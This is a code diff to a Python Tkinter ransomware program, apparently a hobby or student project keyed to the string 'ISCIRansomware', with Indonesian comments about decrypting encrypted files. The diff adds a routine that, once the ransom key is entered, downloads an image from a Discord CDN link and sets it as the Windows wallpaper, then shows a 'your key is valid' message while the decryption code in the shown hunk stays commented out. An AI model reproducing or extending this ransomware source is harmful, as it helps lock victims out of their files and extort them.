@@ -193,8 +193,19 @@ key_input.pack(pady=10, ipady=3)
 def check_key():
 
     if key_input.get() == "ISCIRansomware":
-        messagebox.showinfo(
-            "Success", "Your key is valid\nplase wait for your file decryption process")
+        
+        def change_back_wallpaper():
+            imageUrl = 'https://cdn.discordapp.com/attachments/1066151837151002624/1073982697669668975/th-1340296826.jpeg'
+            r = requests.get(imageUrl)
+            name = "wallpaper.jpeg"
+            file = open(name, "wb")
+            file.write(r.content)
+            file.close()
+            PATH = os.path.abspath(name)
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, PATH, 3)
+
+
+        change_back_wallpaper()
 
         # CODE UNTUK DECRYPT FILE YANG SUDAH DI ENCRYPT
 
@@ -216,6 +227,11 @@ def check_key():
 
         #     with open(file, 'wb') as thefile:
         #         thefile.write(decrypted_content)
+
+        messagebox.showinfo(
+            "Success", "Your key is valid\nplase wait for your file decryption process")
+
+
         app.destroy()
 
     else:
